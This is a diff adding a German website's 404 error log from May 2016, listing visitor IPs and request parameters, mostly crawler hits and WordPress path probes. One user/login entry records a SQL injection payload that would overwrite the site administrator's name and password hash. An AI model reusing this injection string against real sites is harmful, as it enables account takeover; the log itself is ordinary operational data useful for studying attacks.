@@ -1,0 +1,172 @@
+2016-05-12T03:04:17+00:00 ERR (3) 404 Seite nicht gefunden
+REMOTE_ADDR: 46.188.39.81
+HTTP_REFERER: http://graphicore.de/forum/index.php
+requested: array(3) {
+  ["controller"] => string(5) "forum"
+  ["action"] => string(9) "index.php"
+  ["module"] => string(7) "default"
+}
+
+
+--------------------------------------------------------------------------------
+2016-05-12T05:04:38+00:00 ERR (3) 404 Seite nicht gefunden
+REMOTE_ADDR: 66.249.78.231
+HTTP_REFERER: 
+requested: array(3) {
+  ["controller"] => string(11) ".well-known"
+  ["action"] => string(26) "apple-app-site-association"
+  ["module"] => string(7) "default"
+}
+
+
+--------------------------------------------------------------------------------
+2016-05-12T05:05:50+00:00 ERR (3) 404 Seite nicht gefunden
+REMOTE_ADDR: 66.249.66.52
+HTTP_REFERER: 
+requested: array(3) {
+  ["controller"] => string(26) "apple-app-site-association"
+  ["action"] => string(5) "index"
+  ["module"] => string(7) "default"
+}
+
+
+--------------------------------------------------------------------------------
+2016-05-12T07:12:14+00:00 ERR (3) 404 Seite nicht gefunden
+REMOTE_ADDR: 176.9.10.227
+HTTP_REFERER: 
+requested: array(3) {
+  ["controller"] => string(5) "diary"
+  ["action"] => string(4) "atom"
+  ["module"] => string(7) "default"
+}
+
+
+--------------------------------------------------------------------------------
+2016-05-12T09:37:51+00:00 ERR (3) 404 Seite nicht gefunden
+REMOTE_ADDR: 65.60.12.130
+HTTP_REFERER: 
+requested: array(8) {
+  ["controller"] => string(4) "user"
+  ["action"] => string(5) "login"
+  ["module"] => string(7) "default"
+  ["name"] => array(2) {
+    ["0;update users set name = 'Maronox' , pass = '$S$DrV4X74wt6bT3BhJa4X0.XO5bHXl/QBnFkdDkYSHj3cE1Z5clGwu',status ='1' where uid = '1';#"] => string(4) "FcUk"
+    [0] => string(4) "Crap"
+  }
+  ["pass"] => string(4) "test"
+  ["form_build_id"] => string(0) ""
+  ["form_id"] => string(10) "user_login"
+  ["op"] => string(6) "Log in"
+}
+
+
+--------------------------------------------------------------------------------
+2016-05-12T13:00:29+00:00 ERR (3) 404 "hire-lasse" was not found.
+REMOTE_ADDR: 40.77.167.84
+HTTP_REFERER: 
+requested: array(5) {
+  ["lang"] => string(2) "de"
+  ["action"] => string(4) "page"
+  ["key"] => string(10) "hire-lasse"
+  ["module"] => string(7) "default"
+  ["controller"] => string(5) "index"
+}
+
+
+--------------------------------------------------------------------------------
+2016-05-12T15:59:44+00:00 ERR (3) 404 Seite nicht gefunden
+REMOTE_ADDR: 69.30.201.98
+HTTP_REFERER: 
+requested: array(8) {
+  ["controller"] => string(5) "forum"
+  ["action"] => string(13) "viewtopic.php"
+  ["module"] => string(7) "default"
+  ["t"] => string(2) "13"
+  ["start"] => string(1) "0"
+  ["postdays"] => string(1) "0"
+  ["postorder"] => string(3) "asc"
+  ["highlight"] => string(0) ""
+}
+
+
+--------------------------------------------------------------------------------
+2016-05-12T20:18:10+00:00 ERR (3) 404 Seite nicht gefunden
+REMOTE_ADDR: 46.119.127.129
+HTTP_REFERER: 
+requested: array(4) {
+  ["controller"] => string(10) "xmlrpc.php"
+  ["action"] => string(5) "index"
+  ["module"] => string(7) "default"
+  ["rsd"] => string(0) ""
+}
+
+
+--------------------------------------------------------------------------------
+2016-05-12T20:18:10+00:00 ERR (3) 404 Seite nicht gefunden
+REMOTE_ADDR: 46.119.127.129
+HTTP_REFERER: 
+requested: array(3) {
+  ["controller"] => string(4) "blog"
+  ["action"] => string(10) "robots.txt"
+  ["module"] => string(7) "default"
+}
+
+
+--------------------------------------------------------------------------------
+2016-05-12T20:18:10+00:00 ERR (3) 404 Seite nicht gefunden
+REMOTE_ADDR: 46.119.127.129
+HTTP_REFERER: 
+requested: array(3) {
+  ["controller"] => string(4) "blog"
+  ["action"] => string(5) "index"
+  ["module"] => string(7) "default"
+}
+
+
+--------------------------------------------------------------------------------
+2016-05-12T20:18:10+00:00 ERR (3) 404 Seite nicht gefunden
+REMOTE_ADDR: 46.119.127.129
+HTTP_REFERER: 
+requested: array(3) {
+  ["controller"] => string(9) "wordpress"
+  ["action"] => string(5) "index"
+  ["module"] => string(7) "default"
+}
+
+
+--------------------------------------------------------------------------------
+2016-05-12T20:18:11+00:00 ERR (3) 404 Seite nicht gefunden
+REMOTE_ADDR: 46.119.127.129
+HTTP_REFERER: 
+requested: array(3) {
+  ["controller"] => string(2) "wp"
+  ["action"] => string(5) "index"
+  ["module"] => string(7) "default"
+}
+
+
+--------------------------------------------------------------------------------
+2016-05-12T20:37:03+00:00 ERR (3) 404 Seite nicht gefunden
+REMOTE_ADDR: 109.228.12.92
+HTTP_REFERER: 
+requested: array(3) {
+  ["controller"] => string(12) "wp-login.php"
+  ["action"] => string(5) "index"
+  ["module"] => string(7) "default"
+}
+
+
+--------------------------------------------------------------------------------
+2016-05-12T23:05:04+00:00 ERR (3) 404 Seite nicht gefunden
+REMOTE_ADDR: 198.252.44.13
+HTTP_REFERER: 
+requested: array(5) {
+  ["controller"] => string(6) "https:"
+  [""] => string(19) "silber-und-blei.com"
+  ["galerie"] => string(5) "embed"
+  ["action"] => string(5) "index"
+  ["module"] => string(7) "default"
+}
+
+
+--------------------------------------------------------------------------------
